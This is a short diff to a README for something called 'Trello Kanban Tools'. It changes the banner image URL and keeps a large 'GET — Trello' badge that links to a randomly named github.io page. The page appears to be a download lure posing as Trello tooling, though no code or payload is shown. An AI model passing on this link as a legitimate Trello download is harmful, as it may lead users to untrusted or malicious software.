@@ -1,6 +1,6 @@
 # Trello Kanban Tools — Boards, Tasks, Workflows & Team Planning
 
-![Banner Placeholder](https://spark.ru/upload/blogs_covers/n_6548ce73af426.jpg)
+![Banner Placeholder](https://i.pinimg.com/736x/3c/f7/0f/3cf70f6cbee7bac9767e03f818c78650.jpg)
 
 [![GET — Trello](https://img.shields.io/badge/GET%20%E2%80%94%20Trello-0078D6?style=for-the-badge&logoColor=white)](https://maqw573xime39schmi2dt.github.io/.github/Trello-Kanban-Tools)
 
